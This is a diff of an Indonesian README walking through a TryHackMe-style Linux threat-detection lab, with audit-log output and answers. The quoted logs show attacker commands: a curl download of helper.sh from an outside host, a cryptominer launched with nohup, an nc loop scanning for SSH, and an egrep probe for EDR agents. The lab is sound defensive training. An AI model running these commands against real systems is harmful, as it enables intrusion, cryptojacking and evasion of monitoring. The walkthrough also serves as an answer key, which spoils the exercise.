@@ -1,4 +1,4 @@
-# Detection-Ancaman-Linux-2
+<img width="689" height="647" alt="image" src="https://github.com/user-attachments/assets/38097786-159b-4ceb-a218-ffb9ed7af0bc" /># Detection-Ancaman-Linux-2
 Deteksi Ancaman Linux 2 Jelajahi tindakan pertama penyerang setelah membobol server Linux dan pelajari cara mendeteksinya.
 
 # Perkenalan
@@ -37,13 +37,18 @@ Jawablah pertanyaan-pertanyaan di bawah ini.
 Jalankan perintah systemd-detect-virtuntuk mendeteksi cloud sistem.
 Apa output perintah yang Anda temukan?
 
-Amazon
+root@thm-vm:/home/ubuntu$ systemd-detect-virt
+amazon
+
+jawaban : Amazon
 
 Jawaban yang Benar
 Sekarang jalankan ps auxdan cari proses EDR atau antivirus.
 Apa jalur lengkap ke biner antimalware yang terdeteksi?
 
-/var/lib/ultrasec/malscan
+jalankan perintah : root@thm-vm:/home/ubuntu$ ps aux
+
+jawaban : /var/lib/ultrasec/malscan
 
 Jawaban yang Benar
 
@@ -84,19 +89,79 @@ Dapatkah Anda melanjutkan investigasi pada VM dan mencari tahu apa yang sebenarn
 Jawablah pertanyaan-pertanyaan di bawah ini.
 Apa jalur skrip yang memulai perintah "hostname"?
 
-/home/itsupport/debug.sh
+<img width="680" height="415" alt="image" src="https://github.com/user-attachments/assets/e61e4c48-f8e7-4109-a313-a2ff81bf543c" />
+
+
+jalankan :root@thm-vm:/home/ubuntu$  ausearch -i -x "hostname"
+
+type=PROCTITLE msg=audit(09/11/25 18:29:48.884:1120) : proctitle=hostname 
+type=CWD msg=audit(09/11/25 18:29:48.884:1120) : cwd=/home/itsupport 
+type=EXECVE msg=audit(09/11/25 18:29:48.884:1120) : argc=1 a0=hostname 
+type=SYSCALL msg=audit(09/11/25 18:29:48.884:1120) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x6402fb76c290 a1=0x6402fb769380 a2=0x6402fb768ca0 a3=0x6402fb769380 items=2 ppid=3771 pid=3772 auid=itsupport uid=itsupport gid=itsupport euid=itsupport suid=itsupport fsuid=itsupport egid=itsupport sgid=itsupport fsgid=itsupport tty=pts2 ses=170 comm=hostname exe=/usr/bin/hostname subj=unconfined key=exec 
+
+jawaban : /home/itsupport/debug.sh
 
 Jawaban yang Benar
 
 Apa perintah Discovery terakhir yang dijalankan oleh skrip tersebut?
 
-ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu
+
+
+root@thm-vm:/home/ubuntu$ cat /home/itsupport/debug.sh
+#!/bin/bash
+# A simple script to check system load.
+# Used by IT support for debugging, don't edit!
+
+# If this script raises any security issue,
+# Please contact the author, greg@tryhackme.thm
+
+echo "--- OS Info ---"
+hostname && uname -a
+
+echo "--- CPU Info ---"
+lscpu | grep -E 'Model name|Socket|Thread|CPU\(s\)'
+
+echo "--- Uptime ---"
+uptime
+
+echo "--- Memory Info ---"
+free -h
+
+echo "--- Filesystem Usage ---"
+df -hT | grep -E '^/dev/'
+
+echo "--- Top memory-consuming processes ---"
+ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -n 10
+
+echo "--- Top CPU-consuming processes ---"
+ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 10
+root@thm-vm:/home/ubuntu$ 
+
+<img width="689" height="647" alt="image" src="https://github.com/user-attachments/assets/1722c472-fc35-470f-8047-619f36ce6a60" />
+
+
+
+jawaban : ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu
 
 Jawaban yang Benar
 
+
+
+
 Berdasarkan isi naskah, apa alamat email penulis naskah tersebut?
 
-greg@tryhackme.thm
+# A simple script to check system load.
+# Used by IT support for debugging, don't edit!
+
+# If this script raises any security issue,
+# Please contact the author, greg@tryhackme.thm
+
+
+
+<img width="678" height="520" alt="image" src="https://github.com/user-attachments/assets/e4712658-950c-417f-9bfe-a68054c3d70d" />
+
+
+jawaban : greg@tryhackme.thm
 
 Jawaban yang Benar
 
@@ -162,18 +227,41 @@ Anda dapat memulai dengan ausearch -i -x <command>   untuk menjawab pertanyaan-p
 Jawablah pertanyaan-pertanyaan di bawah ini.
 Dari domain mana agen Elastic diunduh?
 
-artifacts.elastic.co
+Kami mencari ausearch -i -x wgetunduhan ausearch -i -x curl. Log audit dengan jelas menunjukkan wgetperintah mengunduh dari artifacts.elastic.co
+
+<img width="1236" height="315" alt="image" src="https://github.com/user-attachments/assets/5ebf6b2a-733b-4825-aa81-16d08bcf8ea5" />
+
+
+jawaban : artifacts.elastic.co
 
 Jawaban yang Benar
+
+
 Apa jalur lengkap ke skrip "helper.sh" yang telah diunduh?
 
-/var/tmp/helper.sh
+ausearchlog untuk perintah wgetatau curlakan menampilkan jalur lengkap yang ditentukan oleh -Oflag di baris perintah misalnya, wget
+-O /var/tmp/helper.sh
+
+root@thm-vm:/home/ubuntu$ ausearch -i -x curl
+----
+type=PROCTITLE msg=audit(09/11/25 18:49:39.513:1270) : proctitle=curl http://drobbox-online.thm/helper.sh -O /var/tmp/helper.sh 
+type=CWD msg=audit(09/11/25 18:49:39.513:1270) : cwd=/home/ubuntu 
+type=EXECVE msg=audit(09/11/25 18:49:39.513:1270) : argc=4 a0=curl a1=http://drobbox-online.thm/helper.sh a2=-O a3=/var/tmp/helper.sh 
+type=SYSCALL msg=audit(09/11/25 18:49:39.513:1270) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5ebf0ff7bab0 a1=0x5ebf0fe94890 a2=0x5ebf0ff7f680 a3=0x5ebf0ff2d490 items=2 ppid=3905 pid=3914 auid=ubuntu uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=pts3 ses=174 comm=curl exe=/usr/bin/curl subj=unconfined key=exec 
+root@thm-vm:/home/ubuntu$ 
+
+
+<img width="1241" height="286" alt="image" src="https://github.com/user-attachments/assets/86027818-43da-4b7b-8f9d-2fde62ea6413" />
+
+jawqaban : /var/tmp/helper.sh
 
 Jawaban yang Benar
 Dari semua file yang diunduh, manakah yang lebih mungkin bersifat berbahaya:
 yang diunduh menggunakan curl atau wget?
 
-curl
+Skenario ruangan sering kali menyiratkan bahwa alat-alat tertentu digunakan oleh penyerang untuk tujuan spesifik. curlDalam konteks ini, mungkin digunakan untuk unduhan yang lebih tersembunyi atau khusus, atau URL terkait diidentifikasi sebagai berbahaya melalui intelijen ancaman. Konteks di ruangan tersebut mengisyaratkan bahwa curlunduhan tersebut kemungkinan besar berbahaya, karena wgetmungkin mengunduh perangkat lunak yang sah (seperti agen Elastic).
+
+jawaban : curl
 
 Jawaban yang Benar
 
@@ -224,20 +312,75 @@ Harap dicatat bahwa log auditd dapat dilihat dengan perintah ausearch -i -if /ho
 Jawablah pertanyaan-pertanyaan di bawah ini.
 Alamat IP mana yang berhasil melakukan serangan brute-force pada SSH yang terekspos?
 
-45.9.148.125
+ Dengan menganalisis auth.logentri "Kata sandi yang diterima", khususnya memfilter log dari /home/ubuntu/scenario/audit.logdengan ausearch -i -if /home/ubuntu/scenario/audit.log, kami mencari login yang berhasil dari IP eksternal.
+
+masuk mode root dulu /sudo su
+ Dengan menganalisis auth.logentri "Kata sandi yang diterima", khususnya memfilter log dari /home/ubuntu/scenario/audit.logdengan ausearch -i -if /home/ubuntu/scenario/audit.log, kami mencari login yang berhasil dari IP eksternal.
+
+
+root@thm-vm:/home/ubuntu/scenario$ cat /home/ubuntu/scenario/auth.log | grep "Acce
+pted password"
+2025-09-11T21:13:33.020035+00:00 srv-dev sshd[5339]: Accepted password for root from 45.9.148.125 port 55185 ssh2
+2025-09-11T21:14:28.475913+00:00 srv-dev sshd[5440]: Accepted password for root from 45.9.148.125 port 55195 ssh2
+2025-09-11T21:25:01.440085+00:00 srv-dev sshd[5838]: Accepted password for root from 45.9.148.125 port 55378 ssh2
+2025-09-11T21:25:24.013116+00:00 srv-dev sshd[5914]: Accepted password for root from 45.9.148.125 port 55382 ssh2
+2025-09-11T21:26:22.589035+00:00 srv-dev sshd[5991]: Accepted password for root from 45.9.148.125 port 55388 ssh2
+2025-09-11T21:26:35.493956+00:00 srv-dev sshd[6050]: Accepted password for root from 45.9.148.125 port 55390 ssh2
+root@thm-vm:/home/ubuntu/scenario$ 
+
+<img width="1251" height="347" alt="image" src="https://github.com/user-attachments/assets/fab9b632-7c1f-44da-8d85-09280d09398e" />
+
+
+jawaban : 45.9.148.125
 
 Jawaban yang Benar
 
 Perintah apa yang digunakan penyerang untuk menampilkan daftar pengguna yang terakhir masuk?
 
-last
+
+
+Di dalam auditdlog ( ausearch -i -if /home/ubuntu/scenario/audit.log), kami mencari perintah penemuan. lastPerintah tersebut akan dicatat sebagai bagian dari pengintaian penyerang.
+
+<img width="1250" height="117" alt="image" src="https://github.com/user-attachments/assets/e2d2dbdd-d418-4c60-bc29-41ada8367d24" />
+
+root@thm-vm:/home/ubuntu/scenario$ cat /home/ubuntu/scenario/audit.log | grep "EXE
+CVE" | grep "last"
+type=EXECVE msg=audit(1757625217.709:2126): argc=1 a0="last"
+root@thm-vm:/home/ubuntu/scenario$ 
+
+Di dalam auditdlog ( ausearch -i -if /home/ubuntu/scenario/audit.log), kami mencari perintah penemuan. lastPerintah tersebut akan dicatat sebagai bagian dari pengintaian penyerang.
+
+<img width="1250" height="117" alt="image" src="https://github.com/user-attachments/assets/0d88b16c-725f-46bf-b24e-fff063732382" />
+
+
+jawaban : last
 
 Jawaban yang Benar
 
 Tiga proses EDR mana yang dicari penyerang dengan perintah "egrep"?
 Format Jawaban: Dipisahkan oleh koma, dalam urutan abjad.
 
-ds_agent,falcon,sentinel
+Kami mencari ausearch -i -if /home/ubuntu/scenario/audit.logperintah egrep. Penyerang menggunakannya egrepuntuk memeriksa proses EDR/antivirus yang sedang berjalan untuk melihat apakah proses tersebut dipantau. egrepBaris perintah akan berisi nama-nama ini.
+
+
+
+
+ubuntu@thm-vm:~$ sudo su
+root@thm-vm:/home/ubuntu$ cd /home/ubuntu/scenario/
+root@thm-vm:/home/ubuntu/scenario$ cat /home/ubuntu/scenario/audit.log | grep "EXE
+> CVE" | grep "last"
+type=EXECVE msg=audit(1757625217.709:2126): argc=1 a0="last"
+root@thm-vm:/home/ubuntu/scenario$ cat /home/ubuntu/scenario/audit.log | grep "EXE 
+CVE" | grep "egrep"
+type=EXECVE msg=audit(1757625213.576:2094): argc=4 a0="/bin/sh" a1="/usr/bin/egrep" a2="overlayroot|/media/root-ro|/media/root-rw" a3="/proc/mounts"
+type=EXECVE msg=audit(1757625217.725:2129): argc=4 a0="/bin/sh" a1="/usr/bin/egrep" a2="--color=auto" a3="falcon|sentinel|ds_agent"
+type=EXECVE msg=audit(1757625268.526:2217): argc=4 a0="/bin/sh" a1="/usr/bin/egrep" a2="overlayroot|/media/root-ro|/media/root-rw" a3="/proc/mounts"
+root@thm-vm:/home/ubuntu/scenario$ 
+
+<img width="1242" height="220" alt="image" src="https://github.com/user-attachments/assets/1442713d-dcbb-440c-8b48-3dc45a830c10" />
+
+
+jawaban : ds_agent,falcon,sentinel
 
 Jawaban yang Benar
 
@@ -284,20 +427,68 @@ Gunakan log yang sama dari folder /home/ubuntu/scenario untuk menjawab pertanyaa
 Jawablah pertanyaan-pertanyaan di bawah ini.
 Apa nama arsip berbahaya yang ditransfer melalui SCP?
 
-kernupd.tar.gz
+Kami meninjau auditdlog ( ausearch -i -if /home/ubuntu/scenario/audit.log) untuk scpperintah. Entri log untuk transfer file akan mengungkapkan nama arsip.
+
+
+root@thm-vm:/home/ubuntu/scenario$ ausearch -i -if /home/ubuntu/scenario/audit.log | grep proctitle=*
+type=PROCTITLE msg=audit(09/11/25 21:13:20.093:2033) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:13:23.752:2036) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:13:24.755:2037) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:14:55.515:2254) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
+type=PROCTITLE msg=audit(09/11/25 21:14:55.517:2255) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
+type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2256) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
+type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2257) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
+type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2258) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
+
+<img width="1218" height="210" alt="image" src="https://github.com/user-attachments/assets/c534b932-988c-4008-a7c0-acc3d159c1e7" />
+
+
+jawaban : kernupd.tar.gz
 
 Jawaban yang Benar
 
 Apa baris perintah lengkap untuk menjalankan cryptominer?
 
-nohup /tmp/.apt/kernupd/kernupd
+Kami mencari nohupperintah di auditdlog. Output akan menampilkan baris perintah lengkap, termasuk jalur ke biner cryptominer.
+
+root@thm-vm:/home/ubuntu/scenario$ ausearch -i -if /home/ubuntu/scenario/audit.log | grep proctitle=*
+type=PROCTITLE msg=audit(09/11/25 21:13:20.093:2033) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:13:23.752:2036) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:13:24.755:2037) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:13:27.398:2041) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:13:28.250:2043) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:16:08.557:2336) : proctitle=/usr/sbin/sshd -D -R 
+type=PROCTITLE msg=audit(09/11/25 21:16:08.666:2337) : proctitle=nohup /tmp/.apt/kernupd/kernupd 
+type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/kernupd/kernupd 
+root@thm-vm:/home/ubuntu/scenario$ 
+----
+
+<img width="1197" height="127" alt="image" src="https://github.com/user-attachments/assets/989b5c3f-06f2-4774-94f8-867f8bfa3baa" />
+
+
+jawaban : nohup /tmp/.apt/kernupd/kernupd
 
 Jawaban yang Benar
 
 Rentang alamat IP mana yang dipindai penyerang untuk mencari celah keamanan SSH yang terekspos?
 Contoh Jawaban: 10.0.0.1-10.0.0.126.
 
-10.10.12.1-10.10.12.10
+caranya : Log auditduntuk tsmpemindai ( nohup /tmp/.X26-unix/.rsync/c/tsm ...) akan menunjukkan argumen yang diteruskan kepadanya, termasuk rentang IP yang dikonfigurasi untuk dipindai.
+
+root@thm-vm:/home/ubuntu/scenario$ ausearch -i -if /home/ubuntu/scenario/audit.log
+ | grep proctitle=nohup
+ type=PROCTITLE msg=audit(09/11/25 21:15:20.512:2283) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
+type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2284) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
+type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2285) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
+type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2286) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
+type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2287) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
+type=PROCTITLE msg=audit(09/11/25 21:16:08.666:2337) : proctitle=nohup /tmp/.apt/kernupd/kernupd 
+type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/kernupd/kernupd 
+
+<img width="1226" height="290" alt="image" src="https://github.com/user-attachments/assets/cd04cb51-b752-409b-b022-d45754c05a30" />
+
+
+jawaban : 10.10.12.1-10.10.12.10
 
 Jawaban yang Benar
 
